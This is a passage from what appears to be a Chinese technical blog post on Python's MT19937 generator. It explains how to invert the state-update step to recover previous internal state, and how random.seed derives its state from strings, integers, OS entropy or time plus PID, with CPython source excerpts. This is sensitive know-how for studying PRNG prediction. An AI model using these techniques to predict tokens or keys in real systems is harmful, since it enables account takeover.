-154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"/></g><g data-mml-node="mn" transform="translate(15745.4,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(500,0)"/></g><g data-mml-node="mo" transform="translate(16745.4,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"/></g><g data-mml-node="mi" transform="translate(17023.4,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mi" transform="translate(17513.4,0)"><path data-c="26" d="M156 540Q156 620 201 668T302 716Q354 716 377 671T401 578Q401 505 287 386L274 373Q309 285 416 148L429 132L437 142Q474 191 543 309L562 341V349Q562 368 541 376T498 385H493V431H502L626 428Q709 428 721 431H727V385H712Q688 384 669 379T639 369T618 354T603 337T591 316T578 295Q537 223 506 176T464 117T454 104Q454 102 471 85T497 62Q543 24 585 24Q618 24 648 48T682 113V121H722V112Q721 94 714 75T692 32T646 -7T574 -22Q491 -19 414 42L402 51L391 42Q312 -22 224 -22Q144 -22 93 25T42 135Q42 153 46 169T55 197T74 225T96 249T125 278T156 308L195 347L190 360Q185 372 182 382T174 411T165 448T159 491T156 540ZM361 576Q361 613 348 646T305 679Q272 679 252 649T232 572Q232 497 255 426L259 411L267 420Q361 519 361 576ZM140 164Q140 103 167 64T240 24Q271 24 304 36T356 61T374 77Q295 156 235 262L220 292L210 310L193 293Q177 277 169 268T151 229T140 164Z"/></g><g data-mml-node="mn" transform="translate(18291.4,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g><g data-mml-node="mo" transform="translate(18791.4,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"/></g><g data-mml-node="mo" transform="translate(19069.4,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g></g></g></svg></mjx-container>，这里的<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.928ex" height="1.545ex" role="img" focusable="false" viewbox="0 -683 852 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D44B" d="M42 0H40Q26 0 26 11Q26 15 29 27Q33 41 36 43T55 46Q141 49 190 98Q200 108 306 224T411 342Q302 620 297 625Q288 636 234 637H206Q200 643 200 645T202 664Q206 677 212 683H226Q260 681 347 681Q380 681 408 681T453 682T473 682Q490 682 490 671Q490 670 488 658Q484 643 481 640T465 637Q434 634 411 620L488 426L541 485Q646 598 646 610Q646 628 622 635Q617 635 609 637Q594 637 594 648Q594 650 596 664Q600 677 606 683H618Q619 683 643 683T697 681T738 680Q828 680 837 683H845Q852 676 852 672Q850 647 840 637H824Q790 636 763 628T722 611T698 593L687 584Q687 585 592 480L505 384Q505 383 536 304T601 142T638 56Q648 47 699 46Q734 46 734 37Q734 35 732 23Q728 7 725 4T711 1Q708 1 678 1T589 2Q528 2 496 2T461 1Q444 1 444 10Q444 11 446 25Q448 35 450 39T455 44T464 46T480 47T506 54Q523 62 523 64Q522 64 476 181L429 299Q241 95 236 84Q232 76 232 72Q232 53 261 47Q262 47 267 47T273 46Q276 46 277 46T280 45T283 42T284 35Q284 26 282 19Q279 6 276 4T261 1Q258 1 243 1T201 2T142 2Q64 2 42 0Z"/></g></g></g></svg></mjx-container>由下面推出</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(y &gt;&gt; 1) ^ mag01 = S[i] ^ S[i - 227]</span><br><span class="line"><span class="code">                 = X</span></span><br></pre></td></tr></table></figure></li><li><p>如何判断是否异或了0x9908b0df？</p><ul><li>我们没有 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="1.109ex" height="1.464ex" role="img" focusable="false" viewbox="0 -442 490 647"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g></g></g></svg></mjx-container>，不能直接计算 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="4ex" height="2.084ex" role="img" focusable="false" viewbox="0 -716 1768 921"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mi" transform="translate(490,0)"><path data-c="26" d="M156 540Q156 620 201 668T302 716Q354 716 377 671T401 578Q401 505 287 386L274 373Q309 285 416 148L429 132L437 142Q474 191 543 309L562 341V349Q562 368 541 376T498 385H493V431H502L626 428Q709 428 721 431H727V385H712Q688 384 669 379T639 369T618 354T603 337T591 316T578 295Q537 223 506 176T464 117T454 104Q454 102 471 85T497 62Q543 24 585 24Q618 24 648 48T682 113V121H722V112Q721 94 714 75T692 32T646 -7T574 -22Q491 -19 414 42L402 51L391 42Q312 -22 224 -22Q144 -22 93 25T42 135Q42 153 46 169T55 197T74 225T96 249T125 278T156 308L195 347L190 360Q185 372 182 382T174 411T165 448T159 491T156 540ZM361 576Q361 613 348 646T305 679Q272 679 252 649T232 572Q232 497 255 426L259 411L267 420Q361 519 361 576ZM140 164Q140 103 167 64T240 24Q271 24 304 36T356 61T374 77Q295 156 235 262L220 292L210 310L193 293Q177 277 169 268T151 229T140 164Z"/></g><g data-mml-node="mn" transform="translate(1268,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g></g></g></svg></mjx-container>，但是我们可以利用 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.928ex" height="1.545ex" role="img" focusable="false" viewbox="0 -683 852 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D44B" d="M42 0H40Q26 0 26 11Q26 15 29 27Q33 41 36 43T55 46Q141 49 190 98Q200 108 306 224T411 342Q302 620 297 625Q288 636 234 637H206Q200 643 200 645T202 664Q206 677 212 683H226Q260 681 347 681Q380 681 408 681T453 682T473 682Q490 682 490 671Q490 670 488 658Q484 643 481 640T465 637Q434 634 411 620L488 426L541 485Q646 598 646 610Q646 628 622 635Q617 635 609 637Q594 637 594 648Q594 650 596 664Q600 677 606 683H618Q619 683 643 683T697 681T738 680Q828 680 837 683H845Q852 676 852 672Q850 647 840 637H824Q790 636 763 628T722 611T698 593L687 584Q687 585 592 480L505 384Q505 383 536 304T601 142T638 56Q648 47 699 46Q734 46 734 37Q734 35 732 23Q728 7 725 4T711 1Q708 1 678 1T589 2Q528 2 496 2T461 1Q444 1 444 10Q444 11 446 25Q448 35 450 39T455 44T464 46T480 47T506 54Q523 62 523 64Q522 64 476 181L429 299Q241 95 236 84Q232 76 232 72Q232 53 261 47Q262 47 267 47T273 46Q276 46 277 46T280 45T283 42T284 35Q284 26 282 19Q279 6 276 4T261 1Q258 1 243 1T201 2T142 2Q64 2 42 0Z"/></g></g></g></svg></mjx-container> 的最高位去判断</li><li>因为 0x9908b0df 的二进制是0b10011001000010001011000011011111，同时因为 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="1.109ex" height="1.464ex" role="img" focusable="false" viewbox="0 -442 490 647"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g></g></g></svg></mjx-container> 会进行右移，高位补0，因此若 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.928ex" height="1.545ex" role="img" focusable="false" viewbox="0 -683 852 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D44B" d="M42 0H40Q26 0 26 11Q26 15 29 27Q33 41 36 43T55 46Q141 49 190 98Q200 108 306 224T411 342Q302 620 297 625Q288 636 234 637H206Q200 643 200 645T202 664Q206 677 212 683H226Q260 681 347 681Q380 681 408 681T453 682T473 682Q490 682 490 671Q490 670 488 658Q484 643 481 640T465 637Q434 634 411 620L488 426L541 485Q646 598 646 610Q646 628 622 635Q617 635 609 637Q594 637 594 648Q594 650 596 664Q600 677 606 683H618Q619 683 643 683T697 681T738 680Q828 680 837 683H845Q852 676 852 672Q850 647 840 637H824Q790 636 763 628T722 611T698 593L687 584Q687 585 592 480L505 384Q505 383 536 304T601 142T638 56Q648 47 699 46Q734 46 734 37Q734 35 732 23Q728 7 725 4T711 1Q708 1 678 1T589 2Q528 2 496 2T461 1Q444 1 444 10Q444 11 446 25Q448 35 450 39T455 44T464 46T480 47T506 54Q523 62 523 64Q522 64 476 181L429 299Q241 95 236 84Q232 76 232 72Q232 53 261 47Q262 47 267 47T273 46Q276 46 277 46T280 45T283 42T284 35Q284 26 282 19Q279 6 276 4T261 1Q258 1 243 1T201 2T142 2Q64 2 42 0Z"/></g></g></g></svg></mjx-container> 的最高位若为1，即可判断异或了 0x9908b0df</li></ul></li></ul><p>恢复多组初始状态值代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">invertStep</span>(<span class="params">si, si227</span>):</span><br><span class="line">    <span class="comment"># S[i] ^ S[i-227] == (((I[i] &amp; 0x80000000) | (I[i+1] &amp; 0x7FFFFFFF)) &gt;&gt; 1) ^ (0x9908b0df if I[i+1] &amp; 1 else 0)</span></span><br><span class="line">    X = si ^ si227</span><br><span class="line">    <span class="comment"># we know the LSB of I[i+1] because MSB of 0x9908b0df is set, we can see if the XOR has been applied</span></span><br><span class="line">    mti1 = (X &amp; <span class="number">0x80000000</span>) &gt;&gt; <span class="number">31</span></span><br><span class="line">    <span class="keyword">if</span> mti1:</span><br><span class="line">        X ^= <span class="number">0x9908b0df</span></span><br><span class="line">    <span class="comment"># undo shift right</span></span><br><span class="line">    X &lt;&lt;= <span class="number">1</span></span><br><span class="line">    <span class="comment"># now recover MSB of state I[i]</span></span><br><span class="line">    mti = X &amp; <span class="number">0x80000000</span></span><br><span class="line">    <span class="comment"># recover the rest of state I[i+1]</span></span><br><span class="line">    mti1 += X &amp; <span class="number">0x7FFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> mti, mti1</span><br><span class="line"></span><br><span class="line">I = random.getstate()[<span class="number">1</span>]</span><br><span class="line"><span class="comment"># this will force a state update</span></span><br><span class="line">random.random()</span><br><span class="line">S = random.getstate()[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">227</span>, <span class="number">240</span>):</span><br><span class="line">    Ii, Ii1 = invertStep(S[i], S[i-<span class="number">227</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"<span class="subst">{Ii}</span> == <span class="subst">{I[i]&amp;<span class="number">0x80000000</span>}</span>"</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"<span class="subst">{Ii1}</span> == <span class="subst">{I[i+<span class="number">1</span>]&amp;<span class="number">0x7FFFFFFF</span>}</span>"</span>)</span><br></pre></td></tr></table></figure><h2 id="Python-的内部种子生成机制"><a href="#Python-的内部种子生成机制" class="headerlink" title="Python 的内部种子生成机制"></a>Python 的内部种子生成机制</h2><p>为了理解python下的种子机制，我们看一下<code>Random</code>类中的seed方法是如何实现的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Random</span>(_random.Random):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">seed</span>(<span class="params">self, a=<span class="literal">None</span>, version=<span class="number">2</span></span>):</span><br><span class="line">        <span class="string">"""Initialize internal state from a seed.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        The only supported seed types are None, int, float,</span></span><br><span class="line"><span class="string">        str, bytes, and bytearray.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        None or no argument seeds from current time or from an operating</span></span><br><span class="line"><span class="string">        system specific randomness source if available.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        If *a* is an int, all bits are used.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        For version 2 (the default), all of the bits are used if *a* is a str,</span></span><br><span class="line"><span class="string">        bytes, or bytearray.  For version 1 (provided for reproducing random</span></span><br><span class="line"><span class="string">        sequences from older versions of Python), the algorithm for str and</span></span><br><span class="line"><span class="string">        bytes generates a narrower range of seeds.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> version == <span class="number">1</span> <span class="keyword">and</span> <span class="built_in">isinstance</span>(a, (<span class="built_in">str</span>, <span class="built_in">bytes</span>)):</span><br><span class="line">            a = a.decode(<span class="string">'latin-1'</span>) <span class="keyword">if</span> <span class="built_in">isinstance</span>(a, <span class="built_in">bytes</span>) <span class="keyword">else</span> a</span><br><span class="line">            x = <span class="built_in">ord</span>(a[<span class="number">0</span>]) &lt;&lt; <span class="number">7</span> <span class="keyword">if</span> a <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">map</span>(<span class="built_in">ord</span>, a):</span><br><span class="line">                x = ((<span class="number">1000003</span> * x) ^ c) &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line">            x ^= <span class="built_in">len</span>(a)</span><br><span class="line">            a = -<span class="number">2</span> <span class="keyword">if</span> x == -<span class="number">1</span> <span class="keyword">else</span> x</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> version == <span class="number">2</span> <span class="keyword">and</span> <span class="built_in">isinstance</span>(a, (<span class="built_in">str</span>, <span class="built_in">bytes</span>, <span class="built_in">bytearray</span>)):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(a, <span class="built_in">str</span>):</span><br><span class="line">                a = a.encode()</span><br><span class="line">            a = <span class="built_in">int</span>.from_bytes(a + _sha512(a).digest(), <span class="string">'big'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(a, (<span class="built_in">type</span>(<span class="literal">None</span>), <span class="built_in">int</span>, <span class="built_in">float</span>, <span class="built_in">str</span>, <span class="built_in">bytes</span>, <span class="built_in">bytearray</span>)):</span><br><span class="line">            _warn(<span class="string">'Seeding based on hashing is deprecated\n'</span></span><br><span class="line">                  <span class="string">'since Python 3.9 and will be removed in a subsequent '</span></span><br><span class="line">                  <span class="string">'version. The only \n'</span></span><br><span class="line">                  <span class="string">'supported seed types are: None, '</span></span><br><span class="line">                  <span class="string">'int, float, str, bytes, and bytearray.'</span>,</span><br><span class="line">                  DeprecationWarning, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">super</span>().seed(a)</span><br><span class="line">        self.gauss_next = <span class="literal">None</span></span><br></pre></td></tr></table></figure><p>我们可以利用<code>random.seed</code> 函数手动为随机数生成器设置种子，同时这个函数在导入<code>random</code> 模块时会被自动调用，用于初始化PRNG。自动设置种子的情况下，参数<code>a</code>，即我们所说的种子为None。</p><p><code>seed</code>函数内部在实现时存在两个版本的初始化过程，版本1兼容老版python，会将<code>str</code> 或 <code>bytes</code>哈希成一个64位整数，生成方式类似python的哈希算法，用于将字符串或者字节串形式的种子变成一个整数用于初始化。</p><p>版本2支持<code>str</code>，<code>bytes</code>，<code>bytearray</code>，首先将字符串编码成字节，拼接字节对象和自己的sha512哈希，然后转为一个大端整数作为种子。</p><p><strong>注：当使用 <code>int</code>、<code>float</code> 或 <code>None</code> 类型进行种子初始化时，种子会被直接传递给内部的种子设置过程。</strong></p><p>下面就可以举一个利用等价种子的例子来验证seed内部的运行过程和我们上面说到的一致（VERSION == 2）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">random.seed(<span class="string">'my seed'</span>)</span><br><span class="line"><span class="built_in">print</span>(random.randbytes(<span class="number">32</span>).<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line">sha_512 = hashlib.sha512(<span class="string">'my seed'</span>.encode()).digest().<span class="built_in">hex</span>()</span><br><span class="line">hex_str = <span class="string">'my seed'</span>.encode().<span class="built_in">hex</span>()</span><br><span class="line"><span class="comment"># print(sha_512)  c046d02141256723ba893a44f1a54538aba62218287bc56767433568ca7548571fe1760ba924e2f8b1e9e8887814c985f3827c68fdb09e639f313ec1c83476be</span></span><br><span class="line"><span class="comment"># print(hex_str)  6d792073656564</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 等价种子 0x6d792073656564c046d02141256723ba893a44f1a54538aba62218287bc56767433568ca7548571fe1760ba924e2f8b1e9e8887814c985f3827c68fdb09e639f313ec1c83476be</span></span><br><span class="line">equivalent_seed = <span class="number">0x6d792073656564c046d02141256723ba893a44f1a54538aba62218287bc56767433568ca7548571fe1760ba924e2f8b1e9e8887814c985f3827c68fdb09e639f313ec1c83476be</span></span><br><span class="line">random.seed(equivalent_seed)</span><br><span class="line"><span class="built_in">print</span>(random.randbytes(<span class="number">32</span>).<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure><p><img src="/2025/05/08/PRNG-MT19937%E5%88%86%E6%9E%90/微信截图_20250504170914.png" alt="微信截图_20250504170914"></p><p>实际上在Random类底层调用<code>_randommodule.c</code>的 <code>random_seed</code> 函数实现<code>Random.seed</code></p><p>默认情况使用<code>None</code>进行种子生成，将会执行下面的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (arg == <span class="literal">NULL</span> || arg == Py_None) {</span><br><span class="line">    <span class="keyword">if</span> (random_seed_urandom(self) &lt; <span class="number">0</span>) {</span><br><span class="line">        PyErr_Clear();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Reading system entropy failed, fall back on the worst entropy:</span></span><br><span class="line"><span class="comment">            use the current time and process identifier. */</span></span><br><span class="line">        <span class="keyword">if</span> (random_seed_time_pid(self) &lt; <span class="number">0</span>) {</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>PRNG优先使用操作系统提供的加密安全伪随机数生成器（CSPRNG）进行种子初始化，这些来源的随机数足够不可预测，可以用于密码学用途，比如密钥、Token生成等；如果系统不支持这些加密安全接口，或者接口调用失败（例如沙盒限制、权限问题），Python 会降级使用较弱的熵源，如当前时间和PID</p><h3 id="利用CSPRNG"><a href="#利用CSPRNG" class="headerlink" title="利用CSPRNG"></a>利用CSPRNG</h3><p>系统特定的种子初始化过程由以下函数负责处理：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">random_seed_urandom</span><span class="params">(RandomObject *self)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">uint32_t</span> key[N];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_PyOS_URandomNonblock(key, <span class="keyword">sizeof</span>(key)) &lt; <span class="number">0</span>) {</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    }</span><br><span class="line">    init_by_array(self, key, Py_ARRAY_LENGTH(key));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>关于熵源的详细信息如下摘自 <code>pyurandom</code> 函数的文档字符串：</p><blockquote><p>Used sources of entropy ordered by preference, preferred source first:</p><ul><li>BCryptGenRandom() on Windows</li><li>getrandom() function (ex: Linux and Solaris): call py_getrandom()</li><li>getentropy() function (ex: OpenBSD): call py_getentropy()</li><li>/dev/urandom device</li></ul></blockquote><p>系统 CSPRNG 用于生成 624 个 32 位整数，足以填充 MT PRNG 的整个状态，但这只是初始化工作的一部分，剩余工作由<code>init_by_array</code>完成</p><h3 id="利用时间-PID"><a href="#利用时间-PID" class="headerlink" title="利用时间+PID"></a>利用时间+PID</h3><p>降级熵源</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">random_seed_time_pid</span><span class="params">(RandomObject *self)</span></span><br><span class="line">{</span><br><span class="line">    PyTime_t now;</span><br><span class="line">    <span class="keyword">if</span> (PyTime_Time(&amp;now) &lt; <span class="number">0</span>) {</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> key[<span class="number">5</span>];</span><br><span class="line">    key[<span class="number">0</span>] = (<span class="type">uint32_t</span>)(now &amp; <span class="number">0xffffffff</span>U);</span><br><span class="line">    key[<span class="number">1</span>] = (<span class="type">uint32_t</span>)(now &gt;&gt; <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(MS_WINDOWS) &amp;&amp; 